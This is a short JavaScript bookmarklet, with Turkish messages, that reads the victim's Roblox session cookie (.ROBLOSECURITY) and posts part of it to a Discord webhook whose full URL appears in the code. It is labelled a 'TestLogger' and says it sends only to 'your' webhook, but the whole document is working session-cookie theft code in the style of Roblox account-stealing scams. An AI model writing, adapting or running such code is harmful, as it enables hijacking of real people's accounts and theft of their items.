javascript:(async function(){
    const c = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
    if (!c) return alert('Cookie yok!');
    
    const webhook = prompt('https://discord.com/api/webhooks/1433138730042134631/WSPjVOpdXfRHX3B9HUVPU4RYbCDMapNAJeizsXHp-Zh_XaZztrbI5H9gMFG7NgDlh-5P');
    if (!webhook) return;

    await fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            content: `Cookie: \`${c[1].substring(0,50)}...\``,
            username: 'TestLogger'
        })
    });
    alert('Gönderildi (sadece senin webhookuna)');
})();